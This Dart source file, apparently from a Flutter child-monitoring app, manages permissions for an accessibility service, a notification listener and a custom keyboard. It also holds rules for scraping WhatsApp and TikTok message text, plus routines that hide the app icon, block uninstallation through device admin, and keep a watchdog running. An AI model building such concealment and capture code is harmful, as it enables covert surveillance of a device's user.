// child/services/accessibility_service.dart — Permission helper for all monitoring services
// Uses the setup channel to check/request permissions for:
//   - Accessibility service
//   - Notification listener
//   - Custom keyboard (IME)

import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';

class AccessibilityService {
  static const _setup = MethodChannel('com.kova.child/setup');

  /// Check if accessibility permission is granted
  static Future<bool> isAccessibilityPermissionGranted() async {
    try {
      final result = await _setup.invokeMethod<bool>('isAccessibilityEnabled');
      return result ?? false;
    } catch (e) {
      debugPrint('Error checking accessibility permission: $e');
      return false;
    }
  }

  /// Request accessibility permission (opens system settings)
  static Future<void> requestAccessibilityPermission() async {
    try {
      await _setup.invokeMethod<void>('openAccessibilitySettings');
    } catch (e) {
      debugPrint('Error requesting accessibility permission: $e');
    }
  }

  /// Check if notification listener is enabled
  static Future<bool> isNotificationListenerEnabled() async {
    try {
      final result = await _setup.invokeMethod<bool>(
        'isNotificationListenerEnabled',
      );
      return result ?? false;
    } catch (e) {
      debugPrint('Error checking notification listener: $e');
      return false;
    }
  }

  /// Open notification listener settings
  static Future<void> requestNotificationListenerPermission() async {
    try {
      await _setup.invokeMethod<void>('openNotificationListenerSettings');
    } catch (e) {
      debugPrint('Error opening notification settings: $e');
    }
  }

  /// Check if KOVA keyboard is enabled and selected
  static Future<bool> isKeyboardEnabled() async {
    try {
      final result = await _setup.invokeMethod<bool>('isKeyboardEnabled');
      return result ?? false;
    } catch (e) {
      debugPrint('Error checking keyboard: $e');
      return false;
    }
  }

  /// Check if KOVA keyboard is enabled in settings (but maybe not selected yet)
  static Future<bool> isKeyboardEnabledInSettings() async {
    try {
      final isEnabled = await _setup.invokeMethod<bool>('isKeyboardEnabledInSettings');
      return isEnabled ?? false;
    } catch (e) {
      debugPrint('Error checking keyboard settings: $e');
      return false;
    }
  }

  /// Open input method settings to enable KOVA keyboard
  static Future<void> requestKeyboardPermission() async {
    try {
      await _setup.invokeMethod<void>('openInputMethodSettings');
    } catch (e) {
      debugPrint('Error opening IME settings: $e');
    }
  }

  /// Show keyboard picker to switch to KOVA keyboard
  static Future<void> showKeyboardPicker() async {
    try {
      await _setup.invokeMethod<void>('openInputMethodPicker');
    } catch (e) {
      debugPrint('Error showing IME picker: $e');
    }
  }

  /// Check all services status at once
  static Future<Map<String, bool>> checkAllServices() async {
    final results = await Future.wait([
      isAccessibilityPermissionGranted(),
      isNotificationListenerEnabled(),
      isKeyboardEnabled(),
    ]);
    return {
      'accessibility': results[0],
      'notifications': results[1],
      'keyboard': results[2],
    };
  }

  // ─────────────────────────────────────────────
  // Self-defense setup
  // ─────────────────────────────────────────────

  /// Activate device admin — prevents uninstallation
  static Future<void> activateDeviceAdmin() async {
    try {
      await _setup.invokeMethod<void>('activateDeviceAdmin');
    } catch (e) {
      debugPrint('Error activating device admin: $e');
    }
  }

  /// Default dynamic rules for known hard-to-parse UI updates
  static String get _defaultDynamicRulesJson {
    // Example rules for target apps that may require specific heuristics.
    // If empty or no match, the native service uses the robust generic fallback.
    return '''
    [
      {
        "packageName": "com.whatsapp",
        "messageContainerId": "message_text",
        "messageTextClass": "TextView",
        "excludeRegex": "^(Typing|Online|[0-9]{1,2}:[0-9]{2})"
      },
      {
        "packageName": "com.zhiliaoapp.musically",
        "messageContainerId": "msg_text",
        "messageTextClass": "TextView",
        "excludeRegex": ""
      }
    ]
    ''';
  }

  /// Sync dynamic parsing rules to the native Android service
  static Future<void> syncDynamicRules([String? rulesJson]) async {
    try {
      final jsonToSync = rulesJson ?? _defaultDynamicRulesJson;
      await _setup.invokeMethod<void>('syncDynamicRules', {
        'rulesJson': jsonToSync,
      });
      debugPrint('Successfully synced dynamic parsing rules');
    } catch (e) {
      debugPrint('Error syncing dynamic rules: $e');
    }
  }

  /// Start foreground protection service (watchdog + persistence)
  static Future<void> startProtectionService() async {
    try {
      // Sync rules right before starting protection
      await syncDynamicRules();
      await _setup.invokeMethod<void>('startProtection');
    } catch (e) {
      debugPrint('Error starting protection service: $e');
    }
  }

  /// Hide launcher icon
  static Future<void> hideAppIcon() async {
    try {
      await _setup.invokeMethod<void>('hideIcon');
    } catch (e) {
      debugPrint('Error hiding app icon: $e');
    }
  }
  /// Open AutoStart settings (e.g. on MIUI, ColorOS, EMUI) to ensure persistence
  static Future<bool> openAutoStartSettings() async {
    try {
      final success = await _setup.invokeMethod<bool>('openAutoStartSettings');
      return success ?? false;
    } catch (e) {
      debugPrint('Error opening autostart settings: $e');
      return false;
    }
  }

  /// Open Battery Optimization settings to exempt the app from aggressive killing
  static Future<void> openBatteryOptimizationSettings() async {
    try {
      await _setup.invokeMethod<void>('openBatteryOptimizationSettings');
    } catch (e) {
      debugPrint('Error opening battery optimization settings: $e');
    }
  }

  /// Check if the app is exempt from battery optimization
  static Future<bool> isBatteryOptimizationIgnored() async {
    try {
      final result = await _setup.invokeMethod<bool>('isBatteryOptimizationIgnored');
      return result ?? false;
    } catch (e) {
      return false;
    }
  }
}
